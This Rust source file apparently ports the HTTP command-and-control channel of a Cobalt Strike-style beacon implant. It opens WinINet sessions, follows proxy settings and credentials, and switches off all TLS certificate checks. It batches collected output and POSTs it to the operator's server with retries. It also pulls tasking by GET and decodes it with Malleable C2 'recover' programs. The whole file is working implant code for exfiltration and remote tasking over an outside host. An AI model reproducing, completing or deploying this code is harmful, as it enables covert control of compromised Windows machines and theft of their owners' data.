//! HTTP C2 channel via WinINet (channel.cpp).

use crate::beacon::{
    SETTING_C2_POSTREQ, SETTING_C2_RECOVER, SETTING_C2_REQUEST, SETTING_C2_VERB_GET,
    SETTING_C2_VERB_POST, SETTING_HEADERS_REMOVE, SETTING_HTTP_NO_COOKIES, SETTING_PROXY_BEHAVIOR,
    SETTING_PROXY_CONFIG, SETTING_PROXY_PASSWORD, SETTING_PROXY_USER,
};
use crate::profile::{apply, profile_free, profile_setup, recover, Profile};
use crate::settings::{setting_ptr, setting_short};
use crate::state::{self, SessData};
use crate::tokens::{token_guard_start, token_guard_stop};
use parking_lot::Mutex;
use windows_sys::Win32::Networking::WinInet::*;

pub const PROXYB_MANUAL: u16 = 0;
pub const PROXYB_DIRECT: u16 = 1;
pub const PROXYB_PRECONFIG: u16 = 2;
pub const PROXYB_MANUAL_CREDS: u16 = 4;

// SECURITY_FLAG_* constants live in the WinHttp module in windows-sys 0.61;
// the C++ mixes them into WinINet options. Same values.
pub const SECURITY_FLAG_IGNORE_UNKNOWN_CA: u32 = 0x100;
pub const SECURITY_FLAG_IGNORE_WRONG_USAGE: u32 = 0x200;
pub const SECURITY_FLAG_IGNORE_REVOCATION: u32 = 0x80;
pub const SECURITY_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 0x2000;
pub const SECURITY_FLAG_IGNORE_CERT_CN_INVALID: u32 = 0x1000;

const HTTP_FLAGS: u32 = INTERNET_FLAG_RELOAD
    | INTERNET_FLAG_NO_CACHE_WRITE
    | INTERNET_FLAG_NO_UI
    | INTERNET_FLAG_KEEP_CONNECTION;
const HTTPS_FLAGS: u32 = HTTP_FLAGS
    | INTERNET_FLAG_SECURE
    | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
    | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

const MAX_HTTP_POST: usize = 1024 * 1024 * 2;

static SESSION_H: Mutex<isize> = Mutex::new(0);
static CONNECT_H: Mutex<isize> = Mutex::new(0);
static HTTP_POST_BUFFER: Mutex<Vec<u8>> = Mutex::new(Vec::new());
static HTTPFLAGS: Mutex<u32> = Mutex::new(HTTP_FLAGS);

fn is_https() -> bool {
    (setting_short(crate::beacon::SETTING_PROTOCOL) & crate::beacon::BEACON_PROTO_HTTPS)
        == crate::beacon::BEACON_PROTO_HTTPS
}

pub fn http_init(host: &[u8], port: u16, ua: &[u8]) {
    let timeout: u32 = 240000;
    token_guard_start();

    // set HTTP flags
    let mut flags = if is_https() { HTTPS_FLAGS } else { HTTP_FLAGS };
    if setting_short(SETTING_HTTP_NO_COOKIES) == 1 {
        flags |= INTERNET_FLAG_NO_COOKIES;
    }
    *HTTPFLAGS.lock() = flags;

    let host_c = cstr(host);
    let ua_c = cstr(ua);
    let proxy_c = setting_ptr(SETTING_PROXY_CONFIG).map(|p| cstr(p));

    // create session, respecting the user's proxy configuration
    let session_h = unsafe {
        match setting_short(SETTING_PROXY_BEHAVIOR) {
            PROXYB_PRECONFIG => InternetOpenA(
                ua_c.as_ptr() as *const _,
                INTERNET_OPEN_TYPE_PRECONFIG,
                std::ptr::null(),
                std::ptr::null(),
                0,
            ),
            PROXYB_DIRECT => InternetOpenA(
                ua_c.as_ptr() as *const _,
                INTERNET_OPEN_TYPE_DIRECT,
                std::ptr::null(),
                std::ptr::null(),
                0,
            ),
            PROXYB_MANUAL | PROXYB_MANUAL_CREDS => {
                let pc = proxy_c
                    .as_ref()
                    .map(|p| p.as_ptr() as *const _)
                    .unwrap_or(std::ptr::null());
                InternetOpenA(
                    ua_c.as_ptr() as *const _,
                    INTERNET_OPEN_TYPE_PROXY,
                    pc,
                    std::ptr::null(),
                    0,
                )
            }
            _ => std::ptr::null_mut(),
        }
    };
    *SESSION_H.lock() = session_h as isize;

    if session_h.is_null() {
        token_guard_stop();
        return;
    }

    // 4 minute timeouts
    unsafe {
        InternetSetOptionA(
            session_h,
            INTERNET_OPTION_SEND_TIMEOUT,
            &timeout as *const u32 as *const _,
            std::mem::size_of::<u32>() as u32,
        );
        InternetSetOptionA(
            session_h,
            INTERNET_OPTION_RECEIVE_TIMEOUT,
            &timeout as *const u32 as *const _,
            std::mem::size_of::<u32>() as u32,
        );
    }

    let connect_h = unsafe {
        InternetConnectA(
            session_h,
            host_c.as_ptr() as *const _,
            port,
            std::ptr::null(),
            std::ptr::null(),
            INTERNET_SERVICE_HTTP,
            0,
            0,
        )
    };
    *CONNECT_H.lock() = connect_h as isize;

    // if we have credentials, assign them to this connection immediately
    if setting_short(SETTING_PROXY_BEHAVIOR) == PROXYB_MANUAL_CREDS {
        if let (Some(user), Some(pass)) =
            (setting_ptr(SETTING_PROXY_USER), setting_ptr(SETTING_PROXY_PASSWORD))
        {
            let user_c = cstr(user);
            let pass_c = cstr(pass);
            unsafe {
                InternetSetOptionA(
                    connect_h,
                    INTERNET_OPTION_PROXY_USERNAME,
                    user_c.as_ptr() as *const _,
                    user.len() as u32,
                );
                InternetSetOptionA(
                    connect_h,
                    INTERNET_OPTION_PROXY_PASSWORD,
                    pass_c.as_ptr() as *const _,
                    pass.len() as u32,
                );
            }
        }
    }

    token_guard_stop();
}

pub fn http_close() {
    token_guard_start();
    unsafe {
        let connect_h = *CONNECT_H.lock() as *mut core::ffi::c_void;
        if !connect_h.is_null() {
            InternetCloseHandle(connect_h);
        }
        let session_h = *SESSION_H.lock() as *mut core::ffi::c_void;
        if !session_h.is_null() {
            InternetCloseHandle(session_h);
        }
    }
    *CONNECT_H.lock() = 0;
    *SESSION_H.lock() = 0;
    token_guard_stop();
}

/// Remove/adjust certain headers at the last stage of connection.
unsafe extern "system" fn fix_request_late(
    h_internet: *const core::ffi::c_void,
    _dw_context: usize,
    dw_internet_status: u32,
    _lpv_status_information: *const core::ffi::c_void,
    _dw_status_information_length: u32,
) {
    if dw_internet_status == INTERNET_STATUS_CONNECTED_TO_SERVER {
        if let Some(headers) = setting_ptr(SETTING_HEADERS_REMOVE) {
            let h = cstr(headers);
            HttpAddRequestHeadersA(
                h_internet,
                h.as_ptr() as *const _,
                -1i32 as u32,
                HTTP_ADDREQ_FLAG_REPLACE,
            );
        }
    }
}

fn fix_request(request: *mut core::ffi::c_void) {
    unsafe {
        // if we're an SSL beacon, set these options
        if is_https() {
            let mut flags: u32 = 0;
            let mut flen: u32 = std::mem::size_of::<u32>() as u32;
            InternetQueryOptionA(
                request,
                INTERNET_OPTION_SECURITY_FLAGS,
                &mut flags as *mut u32 as *mut _,
                &mut flen,
            );
            flags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
            flags |= SECURITY_FLAG_IGNORE_WRONG_USAGE;
            flags |= SECURITY_FLAG_IGNORE_REVOCATION;
            flags |= SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
            flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
            InternetSetOptionA(
                request,
                INTERNET_OPTION_SECURITY_FLAGS,
                &flags as *const u32 as *const _,
                std::mem::size_of::<u32>() as u32,
            );
        }

        // register a callback to fix the request later
        if setting_ptr(SETTING_HEADERS_REMOVE).is_some() {
            InternetSetStatusCallback(request as *const _, Some(fix_request_late));
        }
    }
}

fn http_request_is_ok(request: *mut core::ffi::c_void) -> bool {
    unsafe {
        let mut response_text = [0u8; 256];
        let mut response_text_size: u32 = 256;
        if HttpQueryInfoA(
            request,
            HTTP_QUERY_STATUS_CODE,
            response_text.as_mut_ptr() as *mut _,
            &mut response_text_size,
            std::ptr::null_mut(),
        ) == 0
        {
            return false;
        }
        let s = std::str::from_utf8(&response_text[..response_text_size as usize]).unwrap_or("0");
        let status_code = s.trim_end_matches('\0').trim().parse::<u32>().unwrap_or(0);
        status_code == 200
    }
}

/// Send our data if there's data to send.
pub fn http_post_maybe(hook: &[u8]) {
    let http_post_len = state::http_post_len();
    if http_post_len == 0 {
        return;
    }
    let post_buf = HTTP_POST_BUFFER.lock().clone();

    let mut myprofile = Profile::new(0);
    profile_setup(&mut myprofile, http_post_len as usize);

    // set the hook to the URI
    let n = hook.len().min(1024);
    myprofile.uri[..n].copy_from_slice(&hook[..n]);

    // convert the ID to a string (POST request parameter)
    let myid = format!("{}", state::BIGSESSION.lock().myid);
    let myid_bytes = myid.as_bytes();

    let postreq = setting_ptr(SETTING_C2_POSTREQ).unwrap_or(b"");
    apply(
        postreq,
        &mut myprofile,
        myid_bytes,
        myid_bytes.len(),
        &post_buf,
        http_post_len as usize,
    );

    // build the URI
    let params_end = myprofile
        .parameters
        .iter()
        .position(|&c| c == 0)
        .unwrap_or(myprofile.parameters.len());
    let params = &myprofile.parameters[..params_end];
    let uri_end = myprofile.uri.iter().position(|&c| c == 0).unwrap_or(myprofile.uri.len());
    let uri = &myprofile.uri[..uri_end];
    let mut myuri = Vec::with_capacity(uri.len() + params.len());
    myuri.extend_from_slice(uri);
    if params.is_empty() {
        myuri.push(0);
    } else {
        myuri.extend_from_slice(params);
        myuri.push(0);
    }

    token_guard_start();

    let verb = setting_ptr(SETTING_C2_VERB_POST).unwrap_or(b"POST");
    let verb_c = cstr(verb);
    let myuri_c = cstr(&myuri);
    let connect_h = *CONNECT_H.lock() as *mut core::ffi::c_void;
    let httpflags = *HTTPFLAGS.lock();

    // try the request, up to 5 times
    for _ in 0..4 {
        unsafe {
            let request = HttpOpenRequestA(
                connect_h,
                verb_c.as_ptr() as *const _,
                myuri_c.as_ptr() as *const _,
                std::ptr::null(),
                std::ptr::null(),
                std::ptr::null(),
                httpflags,
                0,
            );
            if request.is_null() {
                break;
            }
            fix_request(request);

            let headers_end = myprofile
                .headers
                .iter()
                .position(|&c| c == 0)
                .unwrap_or(myprofile.headers.len());
            let headers = &myprofile.headers[..headers_end];
            let body = &myprofile.buffer[..myprofile.blen];

            HttpSendRequestA(
                request,
                if headers.is_empty() {
                    std::ptr::null()
                } else {
                    headers.as_ptr() as *const _
                },
                headers.len() as u32,
                if body.is_empty() {
                    std::ptr::null()
                } else {
                    body.as_ptr() as *const _
                },
                body.len() as u32,
            );

            if http_request_is_ok(request) {
                InternetCloseHandle(request);
                break;
            }
            InternetCloseHandle(request);
        }
        std::thread::sleep(std::time::Duration::from_millis(500));
    }

    profile_free(&mut myprofile);

    state::set_http_post_len(0);

    token_guard_stop();
}

/// Send our data.
pub fn http_put(hook: &[u8], buffer: &[u8], len: usize, post_now: bool) {
    // allocate if needed
    {
        let mut post_buf = HTTP_POST_BUFFER.lock();
        if post_buf.len() < MAX_HTTP_POST {
            *post_buf = vec![0u8; MAX_HTTP_POST];
        }
    }

    // sanity check so we don't send overly large files
    if (len + 4) > MAX_HTTP_POST {
        return;
    }
    // if too big, send now
    let current = state::http_post_len() as usize;
    if (current + len + 4) > MAX_HTTP_POST {
        http_post_maybe(hook);
    }

    // add length and data
    let flen = (len as u32).to_be_bytes();
    let mut post_buf = HTTP_POST_BUFFER.lock();
    let mut at = state::http_post_len() as usize;
    post_buf[at..at + 4].copy_from_slice(&flen);
    at += 4;
    post_buf[at..at + len].copy_from_slice(&buffer[..len]);
    at += len;
    state::set_http_post_len(at as i32);
    drop(post_buf);

    // execute!
    if post_now {
        http_post_maybe(hook);
    }
}

fn _http_get(hook: &[u8], meta: &SessData, buffer: &mut [u8], max: usize) -> i32 {
    let mut myprofile = Profile::new(0);
    profile_setup(&mut myprofile, meta.length);

    // set the hook to the URI
    let n = hook.len().min(1024);
    myprofile.uri[..n].copy_from_slice(&hook[..n]);

    // apply to the profile
    let request_prog = setting_ptr(SETTING_C2_REQUEST).unwrap_or(b"");
    apply(
        request_prog,
        &mut myprofile,
        &meta.data[..meta.length],
        meta.length,
        b"",
        0,
    );

    // build myuri
    let params_end = myprofile
        .parameters
        .iter()
        .position(|&c| c == 0)
        .unwrap_or(myprofile.parameters.len());
    let params = &myprofile.parameters[..params_end];
    let uri_end = myprofile.uri.iter().position(|&c| c == 0).unwrap_or(myprofile.uri.len());
    let uri = &myprofile.uri[..uri_end];
    let mut myuri = Vec::with_capacity(uri.len() + params.len());
    myuri.extend_from_slice(uri);
    if params.is_empty() {
        myuri.push(0);
    } else {
        myuri.extend_from_slice(params);
        myuri.push(0);
    }

    let verb = setting_ptr(SETTING_C2_VERB_GET).unwrap_or(b"GET");
    let verb_c = cstr(verb);
    let myuri_c = cstr(&myuri);
    let connect_h = *CONNECT_H.lock() as *mut core::ffi::c_void;
    let httpflags = *HTTPFLAGS.lock();

    unsafe {
        let request = HttpOpenRequestA(
            connect_h,
            verb_c.as_ptr() as *const _,
            myuri_c.as_ptr() as *const _,
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
            httpflags,
            0,
        );
        if request.is_null() {
            return -1;
        }
        fix_request(request);

        let headers_end = myprofile
            .headers
            .iter()
            .position(|&c| c == 0)
            .unwrap_or(myprofile.headers.len());
        let headers = &myprofile.headers[..headers_end];
        let body = &myprofile.buffer[..myprofile.blen];

        HttpSendRequestA(
            request,
            if headers.is_empty() {
                std::ptr::null()
            } else {
                headers.as_ptr() as *const _
            },
            headers.len() as u32,
            if body.is_empty() {
                std::ptr::null()
            } else {
                body.as_ptr() as *const _
            },
            body.len() as u32,
        );

        profile_free(&mut myprofile);

        // fail if we didn't get a 200 OK
        if !http_request_is_ok(request) {
            InternetCloseHandle(request);
            return -1;
        }

        // check what we got back
        let mut avail: u32 = 0;
        let status = InternetQueryDataAvailable(request, &mut avail, 0, 0);
        if status == 0 || avail as usize >= max {
            InternetCloseHandle(request);
            return -1;
        }
        if avail == 0 {
            InternetCloseHandle(request);
            return 0;
        }

        // download the content
        let mut read: usize = 0;
        while read < max {
            let mut downloaded: u32 = 0;
            if InternetReadFile(
                request,
                buffer[read..].as_mut_ptr() as *mut _,
                4096,
                &mut downloaded,
            ) == 0
            {
                break;
            }
            if downloaded == 0 {
                break;
            }
            read += downloaded as usize;
        }

        if read >= max {
            InternetCloseHandle(request);
            return -1;
        }

        InternetCloseHandle(request);

        // process the data we read with the Malleable C2 program
        let recover_prog = setting_ptr(SETTING_C2_RECOVER).unwrap_or(b"");
        read = recover(recover_prog, &mut buffer[..read], read, max);
        read as i32
    }
}

pub fn http_get(hook: &[u8], cookie: &SessData, buffer: &mut [u8], max: usize) -> i32 {
    token_guard_start();
    let rv = _http_get(hook, cookie, buffer, max);
    token_guard_stop();
    rv
}

fn cstr(s: &[u8]) -> Vec<u8> {
    let mut v = s.to_vec();
    if !v.ends_with(&[0]) {
        v.push(0);
    }
    v
}
